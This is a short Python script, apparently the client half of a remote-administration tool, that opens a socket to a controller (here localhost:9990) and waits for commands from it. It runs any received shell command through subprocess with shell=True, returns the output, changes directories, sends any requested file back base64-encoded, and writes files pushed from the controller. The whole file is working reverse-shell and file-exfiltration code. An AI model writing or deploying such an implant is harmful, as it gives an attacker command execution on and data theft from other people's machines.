from datetime import datetime
import json
import os
import socket 
import subprocess
from typing import List
import base64

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("localhost", 9990))     
print("Success connect")

def download_from_client(command):            
    _, _, filepath, _ = command.split()
    try:
        with open(filepath, "+rb") as file:
            file=base64.b64encode(file.read()) 
        client_socket.send(file)               
    except(Exception) as e:
        message = f"Error: {e}"
        client_socket.send(message.encode())

def download_from_server(command):             
    _, newpath = command.split(' ')
    path=newpath.split('/')
    n=len(path)
    pathdir:str = ""
    for i in range(n-1):
        pathdir=pathdir+path[i]+"/"
    file = client_socket.recv(1572864)         
    if not os.path.exists(pathdir):
        os.makedirs(pathdir)
    try:
        with open((newpath),"wb") as output_file:
            output_file.write(base64.b64decode(file))                               
        client_socket.send(f"Файл скачен на компьютер по пути {newpath}".encode())  
    except(Exception) as e:
        message = f"Error: {e}"
        client_socket.send(message.encode())

def cd_command(command):                        
    # cd /home/user/test
    list_command = command.split(' ')
    os.chdir(list_command[1])                                                
    client_socket.send(f"Change directory on {list_command[1]}".encode())      
    
def interact_console():                         
    while True:
        command = client_socket.recv(1024).decode()                                 
        try:
            if "cd" in command:
                cd_command(command)                                              
            elif "upd" in command:
                if "dwd" in command:
                    download_from_client(command)                                   
                else:
                    download_from_server(command)                                   
            else:
                ex = subprocess.check_output(command, shell=True).decode()          
                if not ex:
                    client_socket.send(b"\n")                                      
                else:
                    client_socket.send(ex.encode())                                 
        except subprocess.CalledProcessError:
            client_socket.send("Not found command\n".encode())                      

interact_console()